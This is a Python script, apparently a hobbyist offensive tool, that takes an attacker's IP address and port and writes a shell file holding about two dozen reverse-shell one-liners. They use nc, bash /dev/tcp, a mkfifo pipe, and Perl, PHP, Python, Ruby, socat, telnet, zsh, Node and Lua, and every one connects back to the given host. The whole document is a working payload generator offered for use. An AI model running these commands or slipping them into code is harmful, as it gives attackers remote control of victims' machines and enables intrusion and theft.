#!/usr/bin/env python3
import sys
import argparse
banner = '''
░█████╗░██╗░░░██╗████████╗░█████╗░██████╗░███████╗██╗░░░██╗░░░░██████╗██╗░░██╗
██╔══██╗██║░░░██║╚══██╔══╝██╔══██╗██╔══██╗██╔════╝██║░░░██║░░░██╔════╝██║░░██║
███████║██║░░░██║░░░██║░░░██║░░██║██████╔╝█████╗░░╚██╗░██╔╝░░░╚█████╗░███████║
██╔══██║██║░░░██║░░░██║░░░██║░░██║██╔══██╗██╔══╝░░░╚████╔╝░░░░░╚═══██╗██╔══██║
██║░░██║╚██████╔╝░░░██║░░░╚█████╔╝██║░░██║███████╗░░╚██╔╝░░██╗██████╔╝██║░░██║
╚═╝░░╚═╝░╚═════╝░░░░╚═╝░░░░╚════╝░╚═╝░░╚═╝╚══════╝░░░╚═╝░░░╚═╝╚═════╝░╚═╝░░╚═╝
-------------------------------------------------------------------------------
                                    BoyFromFuture
-------------------------------------------------------------------------------'''
print(banner)
parser = argparse.ArgumentParser()
parser.add_argument('-i','--ipaddr', type=str,help='LHOST',required=True)
parser.add_argument('-p','--port', type=int ,help='LPORT',required=True)
parser.add_argument('-o','--out', type=str ,help='Output File Name [Excluding (.)sh Extension][OPTIONAL]',default="autorev")
args = parser.parse_args()
print(f'[+]Generating a script for {args.ipaddr}:{args.port}')
script = f'''
nc -e /bin/bash {args.ipaddr} {args.port} 
nc -e /bin/sh {args.ipaddr} {args.port} 
bash -c 'exec bash -i &>/dev/tcp/{args.ipaddr}/{args.port} <&1'
sh -i >& /dev/tcp/{args.ipaddr}/{args.port} 0>&1
0<&196;exec 196<>/dev/tcp/{args.ipaddr}/{args.port}; sh <&196 >&196 2>&196
exec 5<>/dev/tcp/{args.ipaddr}/{args.port};cat <&5 | while read line; do $line 2>&5 >&5; done 
sh -i 5<> /dev/tcp/{args.ipaddr}/{args.port} 0<&5 1>&5 2>&5 
sh -i >& /dev/udp/{args.ipaddr}/{args.port} 0>&1 
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|sh -i 2>&1|nc {args.ipaddr} {args.port} >/tmp/f 
nc -c sh {args.ipaddr} {args.port} 
perl -MIO -e '$p=fork;exit,if($p);$c=new IO::Socket::INET(PeerAddr,"{args.ipaddr}:{args.port}");STDIN->fdopen($c,r);$~->fdopen($c,w);system$_ while<>;'
php -r '$sock=fsockopen("{args.ipaddr}",{args.port});exec("sh <&3 >&3 2>&3");'
php -r '$sock=fsockopen("{args.ipaddr}",{args.port});shell_exec("sh <&3 >&3 2>&3");'
php -r '$sock=fsockopen("{args.ipaddr}",{args.port});system("sh <&3 >&3 2>&3");'
export RHOST="{args.ipaddr}";export RPORT={args.port};python -c 'import sys,socket,os,pty;s=socket.socket();s.connect((os.getenv("RHOST"),int(os.getenv("RPORT"))));[os.dup2(s.fileno(),fd) for fd in (0,1,2)];pty.spawn("sh")'
python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("{args.ipaddr}",{args.port}));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn("sh")'
export RHOST="{args.ipaddr}";export RPORT={args.port};python3 -c 'import sys,socket,os,pty;s=socket.socket();s.connect((os.getenv("RHOST"),int(os.getenv("RPORT"))));[os.dup2(s.fileno(),fd) for fd in (0,1,2)];pty.spawn("sh")'
python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("{args.ipaddr}",{args.port}));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn("sh")'
ruby -rsocket -e'spawn("sh",[:in,:out,:err]=>TCPSocket.new("{args.ipaddr}",{args.port}))'
socat TCP:{args.ipaddr}:{args.port} EXEC:sh
require('child_process').exec('nc -e sh {args.ipaddr} {args.port}'
TF=$(mktemp -u);mkfifo $TF && telnet {args.ipaddr} {args.port} 0<$TF | sh 1>$TF 
zsh -c 'zmodload zsh/net/tcp && ztcp {args.ipaddr} {args.port} && zsh >&$REPLY 2>&$REPLY 0>&$REPLY'
lua -e "require('socket');require('os');t=socket.tcp();t:connect('{args.ipaddr}','{args.port}');os.execute('sh -i <&3 >&3 2>&3');"

'''
open(f'{args.out}.sh','w').write(script)

